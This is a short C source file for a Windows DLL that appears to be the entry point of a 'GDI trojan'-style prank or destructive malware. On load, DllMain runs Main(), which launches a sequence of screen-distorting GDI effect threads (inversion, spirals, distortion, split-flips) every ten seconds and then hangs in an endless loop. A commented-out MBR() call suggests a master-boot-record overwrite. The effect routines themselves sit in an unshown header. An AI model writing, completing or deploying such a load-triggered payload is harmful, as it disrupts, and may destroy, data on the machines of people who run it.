#include "dep.h"

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
		Main();
	else if (ul_reason_for_call == DLL_THREAD_ATTACH)
		Main();
	return TRUE;
}

void Main() {
	//MBR();
	HANDLE creategdithread = CreateThread(NULL, NULL, &SideIncInvert, NULL, NULL, NULL);
	Sleep(10000);
	creategdithread = CreateThread(NULL, NULL, &InvertedTriangles, NULL, NULL, NULL);
	Sleep(10000);
	creategdithread = CreateThread(NULL, NULL, &InvertedCircles, NULL, NULL, NULL);
	Sleep(10000);
	creategdithread = CreateThread(NULL, NULL, &Distort, NULL, NULL, NULL);
	Sleep(10000);
	creategdithread = CreateThread(NULL, NULL, &Spiral, NULL, NULL, NULL);
	Sleep(10000);
	creategdithread = CreateThread(NULL, NULL, &SplitFlip, NULL, NULL, NULL);
	Sleep(10000);
	while (TRUE) {}
}